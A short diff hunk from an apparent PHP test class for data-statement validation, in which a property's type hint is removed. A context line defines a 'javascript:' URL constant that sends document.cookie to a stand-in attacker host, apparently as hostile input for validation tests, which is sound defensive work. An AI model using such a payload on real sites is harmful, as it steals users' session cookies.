@@ -8,7 +8,7 @@ class DataStatementValidationTest extends DatabaseTestCase
     private const REPOSITORY_URL = 'https://demo.dataverse.org/dataset.xhtml?persistentId=doi:10.5072/FK2/U6AEZM';
     private const SCRIPT_URL = "javascript:fetch('//attacker.invalid/'+document.cookie)";
 
-    private DataStatementDispatcher $dispatcher;
+    private $dispatcher;
 
     protected function getMockedRegistryKeys(): array
     {
